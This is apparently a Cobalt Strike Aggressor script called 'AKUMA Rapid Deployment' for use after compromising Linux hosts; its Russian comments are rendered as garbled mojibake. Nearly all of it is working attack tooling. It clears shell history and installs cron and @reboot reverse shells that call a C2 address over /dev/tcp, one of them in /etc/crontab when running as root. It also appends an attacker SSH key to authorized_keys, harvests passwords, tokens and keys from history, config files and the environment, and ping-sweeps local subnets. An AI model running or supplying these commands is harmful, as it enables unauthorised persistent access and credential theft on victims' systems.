# AKUMA's Rapid Deployment Script
# Ð‘Ñ‹ÑÑ‚Ñ€Ð¾Ðµ Ñ€Ð°Ð·Ð²ÐµÑ€Ñ‚Ñ‹Ð²Ð°Ð½Ð¸Ðµ persistence Ð¸ lateral movement Ð¿Ð¾ÑÐ»Ðµ compromise

# ========== CONFIGURATION ==========
%rapid_config = %(
    "c2_server" => "192.168.1.100",
    "backup_ports" => @(4444, 5555, 6666, 7777, 8888),
    "ssh_key" => "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7...", # Your SSH public key here
    "scan_timeout" => 30,
    "max_hosts" => 20
);

# ========== MAIN MENU ==========
popup beacon_bottom {
    menu "ðŸ”¥ AKUMA Rapid Deployment" {
        item "âš¡ Quick Foothold (2min)" {
            akuma_rapid_quick($1);
        }
        item "ðŸŽ¯ Full Deployment (5min)" {
            akuma_rapid_full($1);
        }
        item "ðŸ”’ Persistence Only" {
            akuma_rapid_persistence($1);
        }
        item "ðŸ” Network Recon" {
            akuma_rapid_network($1);
        }
        item "ðŸ” Credential Harvest" {
            akuma_rapid_credentials($1);
        }
        separator();
        menu "âš™ï¸ Configuration" {
            item "ðŸ“ Set C2 Server IP" {
                prompt_text("C2 Server IP:", %rapid_config["c2_server"], closure {
                    %rapid_config["c2_server"] = $2;
                    show_message("C2 Server updated to: " . $2);
                });
            }
            item "ðŸ”§ Set SSH Key" {
                prompt_text("SSH Public Key:", %rapid_config["ssh_key"], closure {
                    %rapid_config["ssh_key"] = $2;
                    show_message("SSH Key updated!");
                });
            }
            item "â„¹ï¸ Show Current Config" {
                $msg = "ðŸ”¥ AKUMA Configuration:\n";
                $msg .= "C2 Server: " . %rapid_config["c2_server"] . "\n";
                $msg .= "Backup Ports: " . join(", ", %rapid_config["backup_ports"]) . "\n";
                $msg .= "SSH Key: " . substr(%rapid_config["ssh_key"], 0, 50) . "...\n";
                show_message($msg);
            }
        }
    }
}

# ========== MAIN DEPLOYMENT FUNCTIONS ==========

sub akuma_rapid_full {
    local('$bid');
    $bid = $1;
    
    blog($bid, "ðŸ”¥ AKUMA Full Deployment Starting...");
    blog($bid, "â±ï¸ Estimated time: 5 minutes");
    
    # ÐŸÐ¾Ð»Ð½Ð¾Ðµ Ñ€Ð°Ð·Ð²ÐµÑ€Ñ‚Ñ‹Ð²Ð°Ð½Ð¸Ðµ
    akuma_deploy_stabilization($bid);
    akuma_deploy_enumeration($bid);
    akuma_deploy_persistence($bid);
    akuma_deploy_credential_harvest($bid);
    akuma_deploy_network_recon($bid);
    
    blog($bid, "âœ… AKUMA Full Deployment Complete!");
}

sub akuma_rapid_quick {
    local('$bid');
    $bid = $1;
    
    blog($bid, "ðŸŽ¯ AKUMA Quick Foothold Starting...");
    blog($bid, "â±ï¸ Estimated time: 2 minutes");
    
    # Ð‘Ñ‹ÑÑ‚Ñ€Ð°Ñ ÑÑ‚Ð°Ð±Ð¸Ð»Ð¸Ð·Ð°Ñ†Ð¸Ñ Ð¸ persistence
    akuma_deploy_stabilization($bid);
    akuma_deploy_quick_persistence($bid);
    akuma_deploy_quick_enum($bid);
    
    blog($bid, "âœ… AKUMA Quick Foothold Complete!");
}

sub akuma_rapid_persistence {
    local('$bid');
    $bid = $1;
    
    blog($bid, "ðŸ”’ AKUMA Persistence Deployment...");
    akuma_deploy_persistence($bid);
    blog($bid, "âœ… All persistence mechanisms deployed!");
}

sub akuma_rapid_network {
    local('$bid');
    $bid = $1;
    
    blog($bid, "ðŸŒ AKUMA Network Reconnaissance...");
    akuma_deploy_network_recon($bid);
    blog($bid, "âœ… Network reconnaissance complete!");
}

sub akuma_rapid_credentials {
    local('$bid');
    $bid = $1;
    
    blog($bid, "ðŸ” AKUMA Credential Harvesting...");
    akuma_deploy_credential_harvest($bid);
    blog($bid, "âœ… Credential harvesting complete!");
}

# ========== DEPLOYMENT PHASES ==========

sub akuma_deploy_stabilization {
    local('$bid');
    $bid = $1;
    
    blog($bid, "ðŸ›¡ï¸ Deploying stabilization measures...");
    
    # ÐžÑ‚ÐºÐ»ÑŽÑ‡Ð°ÐµÐ¼ Ð¸ÑÑ‚Ð¾Ñ€Ð¸ÑŽ Ð¸ ÑÐ¾Ð·Ð´Ð°ÐµÐ¼ Ñ€Ð°Ð±Ð¾Ñ‡ÑƒÑŽ Ð´Ð¸Ñ€ÐµÐºÑ‚Ð¾Ñ€Ð¸ÑŽ
    bshell($bid, "export HISTFILE=/dev/null && unset HISTFILE && history -c");
    bshell($bid, "mkdir -p /tmp/.akuma 2>/dev/null && chmod 755 /tmp/.akuma");
    
    # Ð¡Ð¾Ð·Ð´Ð°ÐµÐ¼ backup ÐºÑ€Ð¸Ñ‚Ð¸Ñ‡Ð½Ñ‹Ñ… Ñ„Ð°Ð¹Ð»Ð¾Ð²
    bshell($bid, "mkdir -p /tmp/.akuma_backup 2>/dev/null");
    bshell($bid, "cp /etc/passwd /tmp/.akuma_backup/passwd.orig 2>/dev/null");
    bshell($bid, "crontab -l > /tmp/.akuma_backup/cron.orig 2>/dev/null");
    
    # Ð¢ÐµÑÑ‚Ð¸Ñ€ÑƒÐµÐ¼ ÑÐ²ÑÐ·Ð½Ð¾ÑÑ‚ÑŒ Ñ C2
    bshell($bid, "ping -c 1 " . %rapid_config["c2_server"] . " >/dev/null 2>&1 && echo 'C2 connectivity: OK' || echo 'C2 connectivity: FAILED'");
    
    blog($bid, "âœ… Stabilization complete!");
}

sub akuma_deploy_enumeration {
    local('$bid');
    $bid = $1;
    
    blog($bid, "ðŸ” Deploying enumeration...");
    
    bshell($bid, "echo '=== AKUMA SYSTEM INFO ==='");
    bshell($bid, "hostname && whoami && id");
    bshell($bid, "uname -a");
    bshell($bid, "cat /etc/os-release 2>/dev/null || cat /etc/issue");
    
    bshell($bid, "echo '=== NETWORK INFO ==='");
    bshell($bid, "ip addr show 2>/dev/null | grep -E 'inet ' | grep -v '127.0.0.1'");
    bshell($bid, "ip route 2>/dev/null | head -5");
    
    bshell($bid, "echo '=== KEY PROCESSES ==='");
    bshell($bid, "ps aux --sort=-%cpu | head -10");
    
    bshell($bid, "echo '=== USERS ==='");
    bshell($bid, "cat /etc/passwd | grep -E '/bin/(bash|zsh|sh)$' | head -10");
    
    blog($bid, "âœ… Enumeration complete!");
}

sub akuma_deploy_persistence {
    local('$bid', '$server', '@ports');
    $bid = $1;
    $server = %rapid_config["c2_server"];
    @ports = %rapid_config["backup_ports"];
    
    blog($bid, "ðŸ”’ Deploying multiple persistence mechanisms...");
    
    # Cron persistence - Ð¾ÑÐ½Ð¾Ð²Ð½Ð¾Ð¹ Ð¸ backup
    bshell($bid, "(crontab -l 2>/dev/null; echo '*/15 * * * * /bin/bash -c \"bash -i >& /dev/tcp/" . $server . "/" . @ports[0] . " 0>&1\"') | crontab -");
    bshell($bid, "(crontab -l 2>/dev/null; echo '@reboot sleep 60 && /bin/bash -c \"bash -i >& /dev/tcp/" . $server . "/" . @ports[1] . " 0>&1\"') | crontab -");
    
    # SSH key persistence
    $ssh_key = %rapid_config["ssh_key"];
    bshell($bid, "mkdir -p ~/.ssh 2>/dev/null && echo '" . $ssh_key . "' >> ~/.ssh/authorized_keys 2>/dev/null && chmod 600 ~/.ssh/authorized_keys 2>/dev/null");
    
    # Profile persistence
    bshell($bid, "echo 'export HISTFILE=/dev/null' >> ~/.bashrc");
    
    # System-wide persistence (ÐµÑÐ»Ð¸ root)
    bshell($bid, "if [ \"$EUID\" -eq 0 ]; then echo '*/20 * * * * root /bin/bash -c \"bash -i >& /dev/tcp/" . $server . "/" . @ports[3] . " 0>&1\"' >> /etc/crontab; fi");
    
    blog($bid, "âœ… Multiple persistence mechanisms deployed!");
}

sub akuma_deploy_quick_persistence {
    local('$bid', '$server', '$port1');
    $bid = $1;
    $server = %rapid_config["c2_server"];
    $port1 = %rapid_config["backup_ports"][0];
    
    blog($bid, "âš¡ Deploying quick persistence...");
    
    # Ð¢Ð¾Ð»ÑŒÐºÐ¾ ÑÐ°Ð¼Ñ‹Ðµ Ð±Ñ‹ÑÑ‚Ñ€Ñ‹Ðµ Ð¼ÐµÑ‚Ð¾Ð´Ñ‹
    bshell($bid, "(crontab -l 2>/dev/null; echo '*/10 * * * * /bin/bash -c \"bash -i >& /dev/tcp/" . $server . "/" . $port1 . " 0>&1\"') | crontab -");
    bshell($bid, "mkdir -p ~/.ssh 2>/dev/null && echo '" . %rapid_config["ssh_key"] . "' >> ~/.ssh/authorized_keys 2>/dev/null");
    
    blog($bid, "âœ… Quick persistence deployed!");
}

sub akuma_deploy_quick_enum {
    local('$bid');
    $bid = $1;
    
    blog($bid, "ðŸ” Quick enumeration...");
    
    bshell($bid, "echo '=== QUICK SYSTEM CHECK ==='");
    bshell($bid, "whoami && hostname && uname -r");
    bshell($bid, "ps aux --sort=-%cpu | head -5");
    bshell($bid, "ss -tlnp 2>/dev/null | head -5");
    
    blog($bid, "âœ… Quick enumeration complete!");
}

sub akuma_deploy_credential_harvest {
    local('$bid');
    $bid = $1;
    
    blog($bid, "ðŸ” Deploying credential harvesting...");
    
    bshell($bid, "echo '=== AKUMA CREDENTIAL HARVEST ==='");
    
    # History files
    bshell($bid, "echo '=== COMMAND HISTORY SECRETS ==='");
    bshell($bid, "cat ~/.bash_history 2>/dev/null | grep -i 'pass\\|secret\\|key' | tail -20");
    bshell($bid, "cat ~/.zsh_history 2>/dev/null | grep -i 'pass\\|secret\\|key' | tail -20");
    
    # SSH keys
    bshell($bid, "echo '=== SSH KEYS ==='");
    bshell($bid, "find /home -maxdepth 3 -name 'id_*' -o -name '*.pem' 2>/dev/null | head -10");
    
    # Config files with passwords
    bshell($bid, "echo '=== CONFIG FILES ==='");
    bshell($bid, "find /home -maxdepth 3 -name '*.conf' -o -name '*.config' 2>/dev/null | xargs grep -l -i 'password' 2>/dev/null | head -10");
    
    # Environment variables
    bshell($bid, "echo '=== ENVIRONMENT SECRETS ==='");
    bshell($bid, "env | grep -i 'pass\\|secret\\|key\\|token' 2>/dev/null");
    
    blog($bid, "âœ… Credential harvest complete!");
}

sub akuma_deploy_network_recon {
    local('$bid');
    $bid = $1;
    
    blog($bid, "ðŸŒ Deploying network reconnaissance...");
    
    # Ð‘Ñ‹ÑÑ‚Ñ€Ð¾Ðµ ÑÐºÐ°Ð½Ð¸Ñ€Ð¾Ð²Ð°Ð½Ð¸Ðµ ÑÐµÑ‚Ð¸
    bshell($bid, "echo '=== NETWORK DISCOVERY ==='");
    bshell($bid, "ip route 2>/dev/null | grep -E '^[0-9]' | awk '{print $1}' | grep '/' | head -5");
    bshell($bid, "arp -a 2>/dev/null | head -10");
    
    # ÐŸÐ¾Ð¸ÑÐº Ð¶Ð¸Ð²Ñ‹Ñ… Ñ…Ð¾ÑÑ‚Ð¾Ð² Ð² Ð»Ð¾ÐºÐ°Ð»ÑŒÐ½Ð¾Ð¹ ÑÐµÑ‚Ð¸
    bshell($bid, "echo '=== PING SWEEP ==='");
    bshell($bid, "for i in {1..10}; do ping -c 1 -W 1 192.168.1.$i >/dev/null 2>&1 && echo \"192.168.1.$i is alive\"; done");
    bshell($bid, "for i in {1..10}; do ping -c 1 -W 1 10.0.0.$i >/dev/null 2>&1 && echo \"10.0.0.$i is alive\"; done");
    
    # ÐŸÑ€Ð¾Ð²ÐµÑ€ÐºÐ° Ð¾Ñ‚ÐºÑ€Ñ‹Ñ‚Ñ‹Ñ… Ð¿Ð¾Ñ€Ñ‚Ð¾Ð² Ð½Ð° localhost
    bshell($bid, "echo '=== LOCAL SERVICES ==='");
    bshell($bid, "ss -tlnp 2>/dev/null | grep LISTEN | head -15");
    
    blog($bid, "âœ… Network reconnaissance complete!");
}

blog("ðŸ”¥ AKUMA Rapid Deployment Script Loaded! Use right-click menu on beacon.");
